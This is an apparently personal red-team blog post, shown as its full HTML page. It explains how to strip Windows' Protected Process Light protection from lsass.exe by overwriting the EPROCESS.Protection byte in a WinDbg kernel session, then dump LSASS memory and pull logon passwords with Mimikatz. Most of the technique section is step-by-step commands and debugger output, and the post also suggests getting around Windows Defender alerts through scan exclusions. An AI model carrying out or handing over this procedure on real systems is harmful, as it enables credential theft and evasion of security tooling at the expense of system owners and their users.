<!DOCTYPE html>
<html>
<head>
	<title>Bypassing PPL Protection and Dumping LSASS Data - Shravan Kumar Sheri</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="Learn how to bypass LSASS PPL protection using WinDbg by modifying the EPROCESS.Protection field to dump credentials from protected processes.">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
	<style>
		* { box-sizing: border-box; }
		body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; margin: 0; padding: 0; line-height: 1.8; color: #333; }

		.progress-bar-container { position: fixed; top: 0; left: 0; width: 100%; height: 4px; background: #e9ecef; z-index: 1001; }
		.progress-bar-fill { height: 100%; background: linear-gradient(90deg, #eb3349, #f45c43); width: 0%; transition: width 0.1s; }

		.navbar { background-color: #1a1a2e !important; padding: 15px 0; box-shadow: 0 2px 10px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 1000; }
		.navbar-brand { color: #fff !important; font-size: 22px; font-weight: 600; }
		.nav-link { color: rgba(255,255,255,0.9) !important; font-size: 16px; margin-left: 20px; transition: color 0.3s; }
		.nav-link:hover { color: #4a9eff !important; }

		.article-header { background: linear-gradient(135deg, #eb3349 0%, #f45c43 100%); color: #fff; padding: 80px 0; }
		.article-header .container { max-width: 800px; }
		.back-link { color: rgba(255,255,255,0.9); text-decoration: none; display: inline-flex; align-items: center; margin-bottom: 30px; font-size: 14px; transition: color 0.3s; }
		.back-link:hover { color: #fff; text-decoration: none; }
		.back-link i { margin-right: 8px; }
		.article-category { display: inline-block; padding: 6px 16px; background: rgba(255,255,255,0.2); border-radius: 20px; font-size: 12px; font-weight: 600; text-transform: uppercase; margin-bottom: 20px; }
		.article-title { font-size: 42px; font-weight: 700; margin-bottom: 20px; line-height: 1.2; }
		.article-meta { display: flex; flex-wrap: wrap; gap: 20px; font-size: 14px; opacity: 0.9; }
		.article-meta span { display: flex; align-items: center; }
		.article-meta i { margin-right: 8px; }

		.article-content { max-width: 800px; margin: 0 auto; padding: 60px 20px; }
		.article-body { background: #fff; padding: 50px; border-radius: 12px; box-shadow: 0 5px 30px rgba(0,0,0,0.08); }
		.article-body h2 { font-size: 28px; font-weight: 700; color: #1a1a2e; margin-top: 40px; margin-bottom: 20px; padding-bottom: 10px; border-bottom: 2px solid #e9ecef; }
		.article-body h2:first-child { margin-top: 0; }
		.article-body h3 { font-size: 22px; font-weight: 600; color: #333; margin-top: 30px; margin-bottom: 15px; }
		.article-body p { font-size: 18px; line-height: 1.8; margin-bottom: 20px; color: #444; }
		.article-body ul, .article-body ol { margin-bottom: 20px; padding-left: 30px; }
		.article-body li { font-size: 18px; line-height: 1.8; margin-bottom: 10px; color: #444; }
		.article-body code { background: #f4f4f4; padding: 3px 8px; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 16px; color: #d63384; }
		.article-body pre { background: #1a1a2e; color: #fff; padding: 25px; border-radius: 8px; overflow-x: auto; margin: 25px 0; }
		.article-body pre code { background: none; color: #fff; padding: 0; }

		.article-body blockquote { border-left: 4px solid #eb3349; padding: 20px 25px; margin: 25px 0; background: #f8f9fa; border-radius: 0 8px 8px 0; }
		.article-body blockquote p { margin: 0; font-style: italic; color: #555; }

		.toc { background: #f8f9fa; padding: 25px 30px; border-radius: 8px; margin-bottom: 40px; }
		.toc h4 { font-size: 16px; font-weight: 700; color: #1a1a2e; margin-bottom: 15px; text-transform: uppercase; }
		.toc ul { list-style: none; padding: 0; margin: 0; }
		.toc li { margin-bottom: 10px; }
		.toc a { color: #555; text-decoration: none; font-size: 15px; transition: color 0.3s; }
		.toc a:hover { color: #eb3349; }

		.share-section { margin-top: 50px; padding-top: 30px; border-top: 1px solid #e9ecef; }
		.share-section h4 { font-size: 16px; font-weight: 600; color: #666; margin-bottom: 15px; }
		.share-buttons { display: flex; gap: 10px; }
		.share-btn { width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff; text-decoration: none; transition: transform 0.3s, opacity 0.3s; }
		.share-btn:hover { transform: scale(1.1); color: #fff; text-decoration: none; }
		.share-btn.twitter { background: #1da1f2; }
		.share-btn.linkedin { background: #0077b5; }
		.share-btn.copy { background: #6c757d; cursor: pointer; }

		.author-box { display: flex; align-items: center; gap: 20px; background: #f8f9fa; padding: 25px; border-radius: 12px; margin-top: 40px; }
		.author-avatar { width: 80px; height: 80px; background: linear-gradient(135deg, #eb3349 0%, #f45c43 100%); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 32px; font-weight: 700; flex-shrink: 0; }
		.author-info h4 { font-size: 18px; font-weight: 700; color: #1a1a2e; margin-bottom: 5px; }
		.author-info p { font-size: 14px; color: #666; margin: 0; }

		.tags { margin-top: 30px; }
		.tag { display: inline-block; padding: 6px 14px; background: #e9ecef; color: #495057; border-radius: 20px; font-size: 13px; margin-right: 8px; margin-bottom: 8px; text-decoration: none; transition: background 0.3s; }
		.tag:hover { background: #dee2e6; text-decoration: none; color: #333; }

		.warning-box { background: #fff3cd; border-left: 4px solid #ffc107; padding: 20px; border-radius: 0 8px 8px 0; margin: 25px 0; }
		.warning-box p { margin: 0; color: #856404; }
		.info-box { background: #e3f2fd; border-left: 4px solid #2196f3; padding: 20px; border-radius: 0 8px 8px 0; margin: 25px 0; }
		.info-box p { margin: 0; color: #1565c0; }

		footer { background: #1a1a2e; color: #fff; padding: 30px 0; text-align: center; margin-top: 60px; }
		footer p { margin: 0; opacity: 0.8; }

		@media (max-width: 768px) {
			.article-title { font-size: 28px; }
			.article-body { padding: 30px 20px; }
			.article-meta { flex-direction: column; gap: 10px; }
			.author-box { flex-direction: column; text-align: center; }
		}
	</style>
</head>
<body>
	<div class="progress-bar-container">
		<div class="progress-bar-fill" id="progressBar"></div>
	</div>

	<nav class="navbar navbar-expand-lg navbar-dark">
		<div class="container">
			<a class="navbar-brand" href="../index.html">Shravan Kumar Sheri</a>
			<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav">
				<span class="navbar-toggler-icon"></span>
			</button>
			<div class="collapse navbar-collapse" id="navbarNav">
				<ul class="navbar-nav ml-auto">
					<li class="nav-item">
						<a class="nav-link" href="../index.html">Home</a>
					</li>
					<li class="nav-item active">
						<a class="nav-link" href="../blog.html">Blog</a>
					</li>
				</ul>
			</div>
		</div>
	</nav>

	<header class="article-header">
		<div class="container">
			<a href="../blog.html" class="back-link">
				<i class="fas fa-arrow-left"></i> Back to Blog
			</a>
			<span class="article-category">Exploitation</span>
			<h1 class="article-title">Bypassing PPL Protection and Dumping LSASS Data</h1>
			<div class="article-meta">
				<span><i class="far fa-calendar"></i> December 16, 2024</span>
				<span><i class="far fa-clock"></i> 8 min read</span>
				<span><i class="far fa-user"></i> Shravan Kumar Sheri</span>
			</div>
		</div>
	</header>

	<article class="article-content">
		<div class="article-body">
			<div class="toc">
				<h4>Table of Contents</h4>
				<ul>
					<li><a href="#introduction">Introduction to LSASS Protection</a></li>
					<li><a href="#protection-bits">Understanding EPROCESS Protection Bits</a></li>
					<li><a href="#bypass-method">The Bypass Method</a></li>
					<li><a href="#windbg-commands">WinDbg Commands</a></li>
					<li><a href="#dumping-lsass">Dumping LSASS Memory</a></li>
					<li><a href="#conclusion">Conclusion</a></li>
				</ul>
			</div>

			<h2 id="introduction">Introduction to LSASS Protection</h2>
			<p>
				LSASS (Local Security Authority Subsystem Service) is a core Windows process (<code>lsass.exe</code>) that enforces security policies and handles authentication and authorization. Modern Windows versions introduced EPROCESS protection bits to mark special system processes like <code>lsass.exe</code>, <code>csrss.exe</code>, etc. as protected or secure, making them resistant to tampering or memory access even from SYSTEM-level code.
			</p>
			<p>
				In simple sense, we can't directly dump them using Process Hacker as it will show "Unable to open the process: Access is denied."
			</p>

			<div class="warning-box">
				<p><strong>Disclaimer:</strong> This article is intended for educational purposes and authorized security testing only. Unauthorized access to systems or credential theft is illegal.</p>
			</div>

			<h2 id="protection-bits">Understanding EPROCESS Protection Bits</h2>
			<p>
				There is a way to bypass LSASS protection by modifying the protection bitmask directly in memory, often mischaracterized as "regex modification." However, this method is quite noisy and easily detectable by modern security tools. It's important to understand that even with Administrator privileges, you can't directly change LSASS's protection level â€” this is because the <code>EPROCESS.Protection</code> field is enforced by the kernel.
			</p>
			<p>
				To modify it, you need either a <strong>kernel debugger like WinDbg</strong> or a <strong>kernel-level exploit</strong>.
			</p>
			<p>
				In WinDbg, you'll notice that the protection level of <code>notepad.exe</code> is <code>0</code>, meaning it's unprotected, while <code>lsass.exe</code> shows <code>'A'</code>, which is hexadecimal <code>0x41</code>. This value encodes the process protection, where the top 4 bits represent the signer. For LSASS, that signer value is 4, marking it as an LSA_LIGHT process under Windows' Protected Process Light (PPL) mechanism.
			</p>

			<pre><code>'A' = 0x41 = Type=1 (PPL), Signer=4 (LSA)</code></pre>

			<h2 id="bypass-method">The Bypass Method</h2>
			<p>
				In order to bypass this, we need to change the protection value to a value which has no protection to it, like <code>notepad.exe</code>, <code>calc.exe</code>, etc. In this case, let's use <code>notepad.exe</code>.
			</p>
			<p>
				To do this we need to know:
			</p>
			<ul>
				<li>The process address of <code>lsass.exe</code> and <code>notepad.exe</code></li>
				<li>The offset of Protection in the EPROCESS data structure</li>
			</ul>
			<p>
				We can run the following commands in WinDbg to get and modify the values.
			</p>

			<h2 id="windbg-commands">WinDbg Commands</h2>
			<p>
				Here are the WinDbg commands to perform the bypass:
			</p>

			<pre><code># Get notepad.exe process address
!process 0 0 notepad.exe

# Get lsass.exe process address
!process 0 0 lsass.exe

# Get the offset of Protection in the EPROCESS data structure
dt nt!_eprocess Protection

# View the current protection value
dt nt!_eprocess &lt;processAddr&gt; Protection.

# Change the protection value
eb &lt;processAddr&gt;+&lt;offset&gt; &lt;ProtectionWanted&gt;</code></pre>

			<h3>Step-by-Step Example</h3>
			<p>
				First, get the LSASS process address:
			</p>
			<pre><code>lkd> !process 0 0 lsass.exe
PROCESS ffffa38a8b9cd080
    SessionId: none  Cid: 06f8    Peb: 402fb62000  ParentCid: 0630
    DirBase: 4a2cbe000  ObjectTable: ffff808d47550c0  HandleCount: 3247.
    Image: lsass.exe</code></pre>

			<p>
				Check the current protection:
			</p>
			<pre><code>lkd> dt nt!_EPROCESS ffffa38a8b9cd080 Protection.
   +0x5fa Protection :
      +0x000 Level    : 0x41 'A'
      +0x000 Type     : 0y001
      +0x000 Audit    : 0y0
      +0x000 Signer   : 0y0100</code></pre>

			<p>
				Now modify the protection to 0 (unprotected):
			</p>
			<pre><code>lkd> eb ffffa38a8b9cd080+0x5fa 0x00

lkd> dt nt!_EPROCESS ffffa38a8b9cd080 Protection.
   +0x5fa Protection :
      +0x000 Level    : 0 ''
      +0x000 Type     : 0y000
      +0x000 Audit    : 0y0
      +0x000 Signer   : 0y0000</code></pre>

			<h2 id="dumping-lsass">Dumping LSASS Memory</h2>
			<p>
				Once the protection level has been successfully modified, we can proceed to dump the <code>lsass.exe</code> memory as <code>lsass.dmp</code>. You can now use Process Hacker or other tools to create a memory dump.
			</p>

			<div class="info-box">
				<p><strong>Note:</strong> Windows Defender may flag this action as a potential Trojan or suspicious activity. However, this alert can be bypassed by adjusting the Defender settings or modifying file permissions. In most cases, simply marking the file as safe or excluding the path from scans is sufficient.</p>
			</div>

			<p>
				After dumping, you can use tools like Mimikatz to extract credentials:
			</p>
			<pre><code>mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords</code></pre>

			<h2 id="conclusion">Conclusion</h2>
			<p>
				This technique demonstrates how PPL protection can be bypassed using kernel debugging capabilities. The key takeaways are:
			</p>
			<ul>
				<li>PPL protection is enforced at the kernel level via <code>EPROCESS.Protection</code></li>
				<li>The protection value <code>0x41</code> indicates LSA_LIGHT (PPL with LSA signer)</li>
				<li>A kernel debugger (WinDbg) or kernel exploit is required to modify the protection</li>
				<li>Setting the protection to <code>0x00</code> removes all protection</li>
				<li>Once unprotected, standard memory dumping tools can access LSASS</li>
			</ul>

			<blockquote>
				<p>Detailed steps on how to bypass Windows Defender detection will be provided in an upcoming blog post.</p>
			</blockquote>

			<div class="tags">
				<a href="#" class="tag">Windows</a>
				<a href="#" class="tag">PPL</a>
				<a href="#" class="tag">LSASS</a>
				<a href="#" class="tag">Credential Dumping</a>
				<a href="#" class="tag">WinDbg</a>
				<a href="#" class="tag">Red Team</a>
			</div>

			<div class="share-section">
				<h4>Share this article</h4>
				<div class="share-buttons">
					<a href="#" class="share-btn twitter" onclick="shareTwitter()" title="Share on Twitter">
						<i class="fab fa-twitter"></i>
					</a>
					<a href="#" class="share-btn linkedin" onclick="shareLinkedIn()" title="Share on LinkedIn">
						<i class="fab fa-linkedin-in"></i>
					</a>
					<div class="share-btn copy" onclick="copyLink()" title="Copy link">
						<i class="fas fa-link"></i>
					</div>
				</div>
			</div>

			<div class="author-box">
				<div class="author-avatar">SK</div>
				<div class="author-info">
					<h4>Shravan Kumar Sheri</h4>
					<p>Security Engineer & Researcher specializing in offensive security, red teaming, and exploit development.</p>
				</div>
			</div>
		</div>
	</article>

	<footer>
		<div class="container">
			<p>&copy; 2025 Shravan Kumar Sheri - All Rights Reserved</p>
		</div>
	</footer>

	<script>
		window.addEventListener('scroll', () => {
			const scrollTop = document.documentElement.scrollTop;
			const scrollHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
			const progress = (scrollTop / scrollHeight) * 100;
			document.getElementById('progressBar').style.width = progress + '%';
		});

		function shareTwitter() {
			const url = encodeURIComponent(window.location.href);
			const text = encodeURIComponent(document.title);
			window.open(`https://twitter.com/intent/tweet?url=${url}&text=${text}`, '_blank');
		}

		function shareLinkedIn() {
			const url = encodeURIComponent(window.location.href);
			window.open(`https://www.linkedin.com/sharing/share-offsite/?url=${url}`, '_blank');
		}

		function copyLink() {
			navigator.clipboard.writeText(window.location.href).then(() => {
				alert('Link copied to clipboard!');
			});
		}

		document.querySelectorAll('.toc a').forEach(link => {
			link.addEventListener('click', function(e) {
				e.preventDefault();
				const targetId = this.getAttribute('href').slice(1);
				const target = document.getElementById(targetId);
				if (target) {
					target.scrollIntoView({ behavior: 'smooth', block: 'start' });
				}
			});
		});
	</script>
</body>
</html>
